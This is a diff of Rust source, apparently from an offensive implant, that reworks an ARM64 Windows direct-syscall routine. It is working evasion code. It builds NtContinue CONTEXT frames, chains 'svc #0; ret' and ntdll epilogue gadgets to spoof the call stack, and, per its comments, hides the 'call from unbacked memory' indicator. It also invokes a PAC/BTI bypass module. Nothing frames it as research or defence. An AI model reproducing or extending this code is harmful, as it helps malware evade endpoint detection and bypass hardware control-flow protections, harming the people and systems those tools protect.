@@ -266,6 +266,11 @@ fn find_libc_svc_gadget() -> usize {
         }
 
         // Scan for the 8-byte gadget pattern: svc #0 (01 00 00 D4) + ret (C0 03 5F D6).
+        // Insert a full memory barrier before reading the code page to prevent
+        // the CPU from speculating / reordering the reads ahead of the address
+        // resolution, which could return stale data if libc is being hot-patched
+        // (e.g., by a security mitigation that remaps .text pages concurrently).
+        std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
         let code = unsafe { std::slice::from_raw_parts(start as *const u8, size) };
         let pattern: [u8; 8] = [0x01, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6];
         for i in 0..=size - 8 {
@@ -1830,241 +1835,166 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         // ── NtContinue-based stack-spoof dispatch (ARM64) ──────────────────
         //
         // On ARM64, `ret` is `br x30` — it does NOT pop from the stack like
-        // x86-64's `ret`.  This means multi-frame chaining via stack-pushed
-        // return addresses is not directly possible.  Instead, we use:
+        // x86-64's `ret`.  To spoof the call chain we use function epilogue
+        // gadgets found in ntdll that load x30 from a controlled stack slot:
         //
-        //   CONTEXT.Lr = first chain frame (a `ret` gadget in a system DLL)
-        //   CONTEXT.Pc = syscall gadget (`svc #0; ret`)
-        //   CONTEXT.Sp = points to our frame buffer (continuation + stack args)
+        //     ldp x29, x30, [sp, #M]   ; load x29/x30 from stack
+        //     add  sp, sp, #N          ; (optional) unwind the frame
+        //     ret                       ; branch to x30 (our continuation)
         //
-        // Execution trace after NtContinue restores the CONTEXT:
-        //   1. CPU executes `svc #0` at the gadget — kernel handles the target
-        //      syscall and returns to user mode at the gadget's `ret`
-        //   2. `ret` = `br x30` → branches to CONTEXT.Lr = chain_frame[0]
-        //      (a `ret` gadget inside a legitimate system DLL function)
-        //   3. chain_frame[0]'s epilogue loads x30 from the stack and `ret`s
-        //      to our continuation address at buf[1]
-        //   4. Resumes at label 2: with X0 = target NTSTATUS
-        //
-        // The chain frame is a function epilogue gadget that loads x30 from
-        // the stack (e.g. `ldp x29, x30, [sp], #N; ret`).  This is the ARM64
-        // equivalent of x86-64's stack-popped return chain.
-        //
-        // For now, the ARM64 path uses a simplified single-frame approach:
-        // CONTEXT.Lr points to a plain `ret` gadget, and the continuation
-        // address is on the stack at buf[1].  The `ret` gadget returns to
-        // whatever x30 points to — but since NtContinue set x30 = chain_frame
-        // (a ret), and that ret goes through x30 again... we need the chain
-        // frame to be a `ldp x29, x30, [sp], #16; ret` epilogue that loads
-        // x30 from buf[1] (continuation) and then rets to it.
-        //
-        // PRACTICAL APPROACH:
-        //   The simplest reliable ARM64 approach is to use the syscall gadget
-        //   itself as the "chain" — set CONTEXT.Lr to a `ret` that points to
-        //   our continuation.  Actually, even simpler: set CONTEXT.Lr directly
-        //   to our continuation address.  The `svc #0; ret` sequence at the
-        //   gadget will: (1) execute the syscall, (2) `ret` to CONTEXT.Lr =
-        //   our continuation.  This is single-frame but eliminates the "call
-        //   from unbacked memory" indicator because the kernel trap frame
-        //   shows the CONTEXT.Pc/Rsp, not agent code.
-        //
-        //   For multi-frame, we'd need to find `ldp x29, x30, [sp], #N; ret`
-        //   epilogue gadgets in system DLLs.  That's a future enhancement.
-        //
-        // Frame buffer layout (ARM64):
-        //   [0] = continuation address (will be CONTEXT.Lr)
-        //   [1] = spare / stack arg 0
-        //   [2..] = stack args (args[8..] on ARM64)
-        //
-        // NOTE: Virtually all NT syscalls use ≤8 register args, so stack
-        // args beyond x0-x7 are extremely rare.  The buffer is mainly for
-        // the continuation address.
+        // See the NtContinue dispatch section below for full details.
 
+        // ── NtContinue dispatch (ARM64, with epilogue-gadget support) ──────
+        //
+        // On ARM64, `ret` is `br x30` — it does NOT pop a return address from
+        // the stack.  To spoof the call chain we use function epilogue gadgets
+        // found in ntdll that load x30 from a controlled stack slot:
+        //
+        //     ldp x29, x30, [sp, #M]   ; load x29 from [sp+M], x30 from [sp+M+8]
+        //     add  sp, sp, #N          ; (optional) unwind the frame
+        //     ret                       ; branch to x30 (our continuation)
+        //
+        // By choosing M >= nstack*8 we place the continuation after the stack-
+        // passed syscall arguments, so the kernel reads the real args from
+        // [sp+0..] while the epilogue reads the continuation from [sp+M+8].
+        //
+        // Sp restoration: we save the original sp in CONTEXT.X20 and restore
+        // it at the continuation.  This avoids depending on the epilogue's
+        // `add sp` to adjust sp correctly.
+        //
+        // Buffer layout (ARM64, nstack stack-passed args):
+        //
+        //   buf[0]       = stack_arg[0]     ← [sp+0]  (arg 9)
+        //   buf[1]       = stack_arg[1]     ← [sp+8]  (arg 10)
+        //   ...
+        //   buf[nstack-1]= stack_arg[n-1]   ← [sp+(n-1)*8]
+        //   buf[nstack]  = fake_x29         ← [sp+nstack*8] (don't care)
+        //   buf[nstack+1]= continuation     ← [sp+nstack*8+8] (loaded into x30)
+        //
+        // For nstack == 0 the buffer collapses to [fake_x29, continuation].
         #[cfg(feature = "stack-spoof")]
-        let legacy_spoof_frame: usize = *NTDLL_SPOOF_FRAME.get_or_init(|| find_ntdll_spoof_frame());
+        {
+            use crate::win_types::{CONTEXT, CONTEXT_CONTROL, CONTEXT_INTEGER};
 
-        #[cfg(feature = "stack-spoof")]
-        let chain: Option<crate::stack_db::ResolvedChain> =
-            crate::stack_db::build_chain().or_else(|| {
-                if legacy_spoof_frame != 0 {
-                    Some(crate::stack_db::ResolvedChain {
-                        frames: vec![crate::stack_db::ChainFrame {
-                            return_addr: legacy_spoof_frame,
-                        }],
-                    })
-                } else {
-                    None
-                }
-            });
+            let ntcontinue_ssn: u32 = *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());
 
-        #[cfg(not(feature = "stack-spoof"))]
-        struct ChainFrame {
-            return_addr: usize,
-        }
-        #[cfg(not(feature = "stack-spoof"))]
-        struct ResolvedChain {
-            frames: Vec<ChainFrame>,
-        }
-        #[cfg(not(feature = "stack-spoof"))]
-        let _chain: Option<ResolvedChain> = None;
+            if ntcontinue_ssn != 0 {
+                // Stack args beyond the 8 register args (x0-x7).
+                let stack_args: &[u64] = if args.len() > 8 { &args[8..] } else { &[] };
+                let nstack = stack_args.len();
 
-        // ── NtContinue dispatch ────────────────────────────────────────────
-        //
-        // ARM64 NOTE: the NtContinue-based stack-spoof path requires the
-        // chain-frame epilogue to load x30 from [sp+8] (the continuation
-        // slot).  When the target syscall has > 8 arguments those stack
-        // args must also live at [sp], so the two regions overlap and
-        // the kernel would misinterpret the chain-frame address /
-        // continuation as syscall arguments.  When stack args are present
-        // we fall through to the simple direct-syscall path which now
-        // correctly spills args[8..] onto the stack.
-        #[cfg(feature = "stack-spoof")]
-        if let Some(ref resolved_chain) = chain {
-            if !resolved_chain.frames.is_empty() {
-                use crate::win_types::{CONTEXT, CONTEXT_CONTROL, CONTEXT_INTEGER};
+                // Try to find an ARM64 epilogue gadget with offset >= nstack*8.
+                if let Some(epilogue) = crate::stack_db::get_arm64_epilogue_for_nstack(nstack) {
+                    let padded_slots = (epilogue.stack_offset as usize) / 8;
+                    let total_slots = padded_slots + 2; // +2 for (fake_x29, continuation)
+                    let mut spoof_frame_buf: Vec<u64> = vec![0u64; total_slots];
 
-                let ntcontinue_ssn: u32 = *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());
+                    // Fill stack args at the beginning of the buffer.
+                    for (i, &arg) in stack_args.iter().enumerate() {
+                        spoof_frame_buf[i] = arg;
+                    }
 
-                if ntcontinue_ssn != 0 {
-                    // Stack args beyond the 8 register args (x0-x7).
-                    let stack_args: &[u64] = if args.len() > 8 { &args[8..] } else { &[] };
-                    let nstack = stack_args.len();
+                    // fake_x29 at padded_slots (value doesn't matter).
+                    spoof_frame_buf[padded_slots] = 0;
 
-                    // ARM64: the NtContinue buffer layout places the chain-
-                    // frame address at buf[0] and the continuation at buf[1],
-                    // with stack args at buf[2..].  Because ctx.Sp points to
-                    // buf[0], the kernel would read the chain frame address
-                    // and continuation as args 9 and 10 instead of the real
-                    // stack args.  Reorganising the layout so that stack args
-                    // precede the chain frame would conflict with the chain-
-                    // frame epilogue (ldp x29,x30,[sp],#N; ret) which expects
-                    // the continuation at [sp+8].  Fall through to the simple
-                    // direct-syscall path which handles stack args correctly.
-                    if nstack > 0 {
-                        // Fall through to simple fallback below.
-                    } else {
-                        // ── No stack args: safe to use NtContinue spoofing ────
-                        // Frame buffer: [continuation] + [stack_args (empty)]
-                        let frame_elems = crate::stack_db::frame_buffer_slots(
-                            resolved_chain.frames.len(),
-                            nstack,
+                    // continuation at padded_slots + 1 — filled by asm.
+                    let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[padded_slots + 1];
+
+                    // Read current sp for later restoration via CONTEXT.X20.
+                    let current_sp: u64;
+                    unsafe {
+                        core::arch::asm!("mov x9, sp", out("x9") current_sp);
+                    }
+
+                    // Build the ARM64 CONTEXT.  Must be 16-byte aligned.
+                    let ctx_size = std::mem::size_of::<CONTEXT>();
+                    let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
+                    let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
+                    let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
+                    let ctx: &mut CONTEXT = unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };
+
+                    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+
+                    ctx.u.s_mut().X8 = ssn as u64;
+                    ctx.u.s_mut().X0 = a1;
+                    ctx.u.s_mut().X1 = a2;
+                    ctx.u.s_mut().X2 = a3;
+                    ctx.u.s_mut().X3 = a4;
+                    ctx.u.s_mut().X4 = a5;
+                    ctx.u.s_mut().X5 = a6;
+                    ctx.u.s_mut().X6 = a7;
+                    ctx.u.s_mut().X7 = a8;
+
+                    // Save original sp in X20 so we can restore at continuation.
+                    ctx.u.s_mut().X20 = current_sp;
+
+                    // Pc → syscall gadget (`svc #0; ret` in ntdll).
+                    ctx.Pc = gadget_addr as u64;
+
+                    // Lr → epilogue gadget.  After `svc #0; ret` at the
+                    // syscall gadget, execution reaches this `ldp x29, x30,
+                    // [sp, #M]` which loads x30 from our buffer and returns.
+                    ctx.u.s_mut().Lr = epilogue.gadget_addr as u64;
+
+                    // Sp → our frame buffer.  Kernel reads stack args from
+                    // [sp+0..]; epilogue reads x30 from [sp+M+8].
+                    ctx.Sp = spoof_frame_buf.as_ptr() as u64;
+
+                    // Ensure writes are visible before the asm dispatch.
+                    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
+
+                    let nt_status_raw: u64;
+                    unsafe {
+                        asm!(
+                            // Fill in the continuation address.
+                            "adr x21, 2f",
+                            "str x21, [{cont_slot}]",
+                            // NtContinue(PCONTEXT, BOOLEAN TestAlert)
+                            "mov x0, {ctx_ptr}",
+                            "mov x1, xzr",
+                            "mov x8, {ntc_ssn}",
+                            "svc #0",
+                            // ── Continuation ──────────────────────────────
+                            // Reached after: gadget `svc #0; ret` →
+                            //   epilogue gadget `ldp x29,x30,[sp,#M]; …; ret` →
+                            //   x30 = continuation → here.
+                            // X0 = NTSTATUS.  X20 = original sp.
+                            "2:",
+                            "mov sp, x20",
+                            "mov x9, x0",
+                            ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
+                            cont_slot = in(reg) cont_slot_ptr as u64,
+                            ntc_ssn   = in(reg) ntcontinue_ssn as u64,
+                            lateout("x9") nt_status_raw,
+                            out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
+                            out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
+                            out("x8")  _,
+                            out("x10") _, out("x11") _,
+                            out("x12") _, out("x13") _, out("x14") _, out("x15") _,
+                            out("x16") _, out("x17") _,
+                            out("x20") _,
+                            out("x21") _,
+                            out("x30") _,
+                            out("v0")  _, out("v1")  _, out("v2")  _, out("v3")  _,
+                            out("v4")  _, out("v5")  _, out("v6")  _, out("v7")  _,
+                            out("v16") _, out("v17") _, out("v18") _, out("v19") _,
+                            out("v20") _, out("v21") _, out("v22") _, out("v23") _,
+                            out("v24") _, out("v25") _, out("v26") _, out("v27") _,
+                            out("v28") _, out("v29") _, out("v30") _, out("v31") _,
                         );
-                        let mut spoof_frame_buf: Vec<u64> = vec![0u64; frame_elems];
-                        let cont_idx = crate::stack_db::populate_frame_buffer(
-                            &mut spoof_frame_buf,
-                            resolved_chain,
-                            stack_args,
-                        );
-                        // For ARM64, cont_idx is always 1 (continuation at buf[1]).
-                        // buf[0] holds the chain frame address that we'll set in CONTEXT.Lr.
-                        let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[cont_idx];
-
-                        // Build the ARM64 CONTEXT.  Must be 16-byte aligned.
-                        let ctx_size = std::mem::size_of::<CONTEXT>();
-                        let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
-                        let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
-                        let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
-                        let ctx: &mut CONTEXT = unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };
-
-                        ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
-
-                        // ARM64 CONTEXT layout via the CONTEXT_u union:
-                        //   ctx.u.s.X0 .. ctx.u.s.X28  — integer registers
-                        //   ctx.u.s.Fp                  — frame pointer (x29)
-                        //   ctx.u.s.Lr                  — link register (x30)
-                        //   ctx.Sp                       — stack pointer
-                        //   ctx.Pc                       — program counter
-                        ctx.u.s_mut().X8 = ssn as u64; // syscall number
-                        ctx.u.s_mut().X0 = a1;
-                        ctx.u.s_mut().X1 = a2;
-                        ctx.u.s_mut().X2 = a3;
-                        ctx.u.s_mut().X3 = a4;
-                        ctx.u.s_mut().X4 = a5;
-                        ctx.u.s_mut().X5 = a6;
-                        ctx.u.s_mut().X6 = a7;
-                        ctx.u.s_mut().X7 = a8;
-
-                        // Pc → syscall gadget (`svc #0; ret` in ntdll).
-                        ctx.Pc = gadget_addr as u64;
-
-                        // Lr → first chain frame's return address (a `ret` gadget
-                        // inside a system DLL).  After the gadget's `svc #0; ret`,
-                        // the CPU branches to this address, continuing the spoof.
-                        //
-                        // For the simplified single-frame approach, this `ret`
-                        // gadget needs to load x30 from the stack to reach our
-                        // continuation.  We use the chain frame address from buf[0].
-                        let chain_addr = spoof_frame_buf[0] as u64;
-                        ctx.u.s_mut().Lr = chain_addr;
-
-                        // Sp → our frame buffer.  The chain frame's epilogue will
-                        // load x30 from [Sp] (which is buf[1] = continuation).
-                        ctx.Sp = spoof_frame_buf.as_ptr() as u64;
-
-                        // Ensure writes are visible before the asm dispatch.
-                        // Full CPU fence for ARM64 weak memory model.
-                        std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
-
-                        let nt_status: i32;
-                        unsafe {
-                            asm!(
-                                // Fill in the continuation address.
-                                // On ARM64, `adr x21, 2f` computes the address of
-                                // label 2 relative to the current PC.  x21 is
-                                // callee-saved so the kernel won't clobber it.
-                                "adr x21, 2f",
-                                "str x21, [{cont_slot}]",
-                                // NtContinue(PCONTEXT, BOOLEAN TestAlert)
-                                //   x0 = CONTEXT pointer
-                                //   x1 = FALSE (0) — no TestAlert
-                                //   x8 = NtContinue SSN
-                                "mov x0, {ctx_ptr}",
-                                "mov x1, xzr",
-                                "mov x8, {ntc_ssn}",
-                                // Direct `svc #0` for NtContinue — no fake frames.
-                                // The kernel restores our CONTEXT, setting up the
-                                // spoofed call stack before the target syscall runs.
-                                "svc #0",
-                                // ── Continuation ──────────────────────────────
-                                // Reached after: gadget `svc #0; ret` →
-                                //   CONTEXT.Lr (chain frame) →
-                                //   loads x30 from stack (continuation) →
-                                //   `ret` → here.
-                                // X0 holds the NTSTATUS from the target syscall.
-                                "2:",
-                                "mov {status:w}, w0",
-                                ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
-                                cont_slot = in(reg) cont_slot_ptr as u64,
-                                ntc_ssn   = in(reg) ntcontinue_ssn as u64,
-                                status    = out(reg) nt_status,
-                                // x21 is used for the continuation address.
-                                // x0-x8, x9-x17 are clobbered by the syscall path.
-                                out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
-                                out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
-                                out("x8")  _,
-                                out("x9")  _, out("x10") _, out("x11") _,
-                                out("x12") _, out("x13") _, out("x14") _, out("x15") _,
-                                out("x16") _, out("x17") _,
-                                out("x21") _,
-                                out("x30") _,
-                                // Caller-saved NEON registers.
-                                out("v0")  _, out("v1")  _, out("v2")  _, out("v3")  _,
-                                out("v4")  _, out("v5")  _, out("v6")  _, out("v7")  _,
-                                out("v16") _, out("v17") _, out("v18") _, out("v19") _,
-                                out("v20") _, out("v21") _, out("v22") _, out("v23") _,
-                                out("v24") _, out("v25") _, out("v26") _, out("v27") _,
-                                out("v28") _, out("v29") _, out("v30") _, out("v31") _,
-                            );
-                        }
-                        // Keep buffers live.
-                        let _ = &spoof_frame_buf;
-                        let _ = &ctx_storage;
-                        return nt_status;
-                    } // end nstack == 0 branch
+                    }
+                    let nt_status = nt_status_raw as u32 as i32;
+                    let _ = &spoof_frame_buf;
+                    let _ = &ctx_storage;
+                    return nt_status;
                 }
-                // NtContinue SSN unavailable — fall through to simple blr path.
+                // No suitable epilogue gadget — fall through to simple fallback.
             }
-            // Chain was empty — fall through.
+            // NtContinue SSN unavailable — fall through.
+        }
+        #[cfg(not(feature = "stack-spoof"))]
+        {
+            // Without stack-spoof, skip the NtContinue path entirely.
         }
 
         // ── Simple direct syscall fallback (ARM64) ─────────────────────────
@@ -2076,7 +2006,7 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         let nstack_a64: usize = stack_args_a64.len();
         let stack_ptr_a64: *const u64 = stack_args_a64.as_ptr();
 
-        let status: i32;
+        let status_raw: u64;
         std::arch::asm!(
             // ── Save SP so we can restore after the call ──────────────────
             // NOTE: Use x20 instead of x19.  LLVM reserves x19 for internal
@@ -2126,10 +2056,8 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             // trailing `ret` uses x30 to return here.  We declare x30 as a
             // clobber so the compiler saves any live value before this block.
             "blr {gadget}",
-            // Copy the 32-bit NTSTATUS from w0 to the compiler-chosen output
-            // register.  Use the :w modifier so both sides are W-registers;
-            // `mov Xd, Ws` is not a valid ARM64 encoding.
-            "mov {status:w}, w0",
+            // Copy the NTSTATUS from x0 into an explicit 64-bit output register.
+            "mov x9, x0",
             // Restore SP.
             "mov sp, x20",
 
@@ -2145,7 +2073,7 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             nstack = in(reg) nstack_a64 as u64,
             stack_ptr = in(reg) stack_ptr_a64 as u64,
             gadget = in(reg) gadget_addr as u64,
-            status = out(reg) status,
+            lateout("x9") status_raw,
             // Declare all caller-saved integer registers (Windows ARM64 ABI).
             // x0-x7 hold args and may be modified by the syscall stub or kernel;
             // x8 holds the syscall number; x9-x17 are volatile scratch registers;
@@ -2154,7 +2082,7 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
             out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
             out("x8")  _,
-            out("x9")  _, out("x10") _, out("x11") _,
+            out("x10") _, out("x11") _,
             out("x12") _, out("x13") _, out("x14") _, out("x15") _,
             out("x16") _, out("x17") _,
             out("x20") _,
@@ -2170,6 +2098,7 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         );
         // Keep stack_args_a64 slice alive until the asm block completes.
         let _ = &stack_args_a64;
+        let status = status_raw as u32 as i32;
         status
     }
 }
@@ -3310,7 +3239,7 @@ macro_rules! clean_call {
                         // with PACIA using the stack pointer as context (matching
                         // what PACIASP would do on function entry).
                         let sp: u64;
-                        std::arch::asm!("mov {}, sp", out(reg) sp);
+                        std::arch::asm!("mov x9, sp", out("x9") sp);
                         let signed_addr = unsafe {
                             $crate::bti_pac_bypass::sign_pointer_with_pacia(addr as usize, sp)
                         };
@@ -3591,7 +3520,7 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
                 // The gadget's `ret` lands here; x0 holds the full signed
                 // syscall return value.  Preserve all 64 bits so negative
                 // errno returns and pointer-sized values are not truncated.
-                "mov {ret}, x0",
+                "mov x9, x0",
                 ssn   = in(reg) ssn as u64,
                 a0    = in(reg) a0,
                 a1    = in(reg) a1,
@@ -3600,7 +3529,7 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
                 a4    = in(reg) a4,
                 a5    = in(reg) a5,
                 gadget = in(reg) gadget as u64,
-                ret   = out(reg) ret,
+                lateout("x9") ret,
                 // Declare all caller-saved / scratch registers that the SVC
                 // entry path or the kernel may clobber.  x0–x7 hold args and
                 // the return value; x8 is the syscall number; x9–x17 are
@@ -3610,7 +3539,7 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
                 out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
                 out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
                 out("x8")  _,
-                out("x9")  _, out("x10") _, out("x11") _,
+                out("x10") _, out("x11") _,
                 out("x12") _, out("x13") _, out("x14") _, out("x15") _,
                 out("x16") _, out("x17") _,
                 out("x30") _,
@@ -3696,10 +3625,11 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
             return Err(libc::EPERM);
         }
 
-        if ret < 0 {
-            Err(-ret as i32)
+        let ret_signed = ret as i64;
+        if ret_signed < 0 {
+            Err((-ret_signed) as i32)
         } else {
-            Ok(ret as u64)
+            Ok(ret)
         }
     }
     #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
